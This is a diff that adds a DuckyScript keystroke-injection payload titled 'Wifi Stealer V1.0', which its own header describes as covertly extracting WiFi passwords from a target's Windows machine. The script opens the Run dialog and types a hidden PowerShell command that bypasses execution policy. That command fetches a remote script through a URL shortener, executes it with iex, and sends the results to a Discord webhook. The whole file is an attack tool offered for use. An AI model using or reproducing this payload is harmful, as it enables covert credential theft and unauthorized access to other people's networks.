@@ -1,0 +1,9 @@
+REM     Title: Wifi Stealer V1.0
+REM     Author: netwrkspider
+REM     Description: This payload discreetly extracts the WiFi passwords from your target's device (Windows) and securely uploads them to a designated Discord channel, providing you with valuable access to their network credentials.
+REM     Target OS : Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dcwebhook='<put your discord webhook url here>';irm https://t.ly/gEWA5 | iex
+ENTER
